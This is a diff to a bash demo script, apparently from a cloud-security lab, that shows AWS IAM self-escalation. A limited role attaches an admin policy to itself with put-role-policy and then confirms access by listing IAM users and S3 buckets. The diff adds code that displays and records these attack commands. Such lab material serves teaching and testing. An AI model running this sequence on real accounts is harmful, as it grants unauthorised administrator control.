@@ -3,7 +3,6 @@
 # Demo script for iam:PutRolePolicy privilege escalation
 # This is a ROLE-BASED self-escalation scenario
 
-set -e
 
 # Disable AWS CLI paging
 export AWS_PAGER=""
@@ -13,6 +12,24 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-005-to-admin-starting-user"
@@ -52,6 +69,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity as user
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -65,6 +83,7 @@ echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $ROLE_ARN"
 
+show_cmd "aws sts assume-role --role-arn $ROLE_ARN --role-session-name iam-005-demo-session"
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
     --role-arn "$ROLE_ARN" \
     --role-session-name "iam-005-demo-session")
@@ -79,6 +98,7 @@ echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 # Step 4: Test current permissions (should be limited)
 echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
     echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
 else
@@ -104,6 +124,7 @@ cat > /tmp/admin-policy.json << EOF
 EOF
 
 echo "Applying admin policy to role (self)..."
+show_attack_cmd "aws iam put-role-policy --role-name $STARTING_ROLE --policy-name self-admin-policy --policy-document file:///tmp/admin-policy.json"
 aws iam put-role-policy \
     --role-name "$STARTING_ROLE" \
     --policy-name "self-admin-policy" \
@@ -119,10 +140,12 @@ echo ""
 # Step 6: Verify admin access
 echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
 echo "Testing admin permissions (listing IAM users)..."
+show_cmd "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
 IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
 echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
 echo "Testing S3 access..."
+show_cmd "aws s3 ls"
 aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
@@ -141,6 +164,17 @@ echo -e "Result: ${GREEN}Administrator Access${NC}"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (PutRolePolicy on self) → Admin"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo ""
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the self-admin-policy${NC}"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
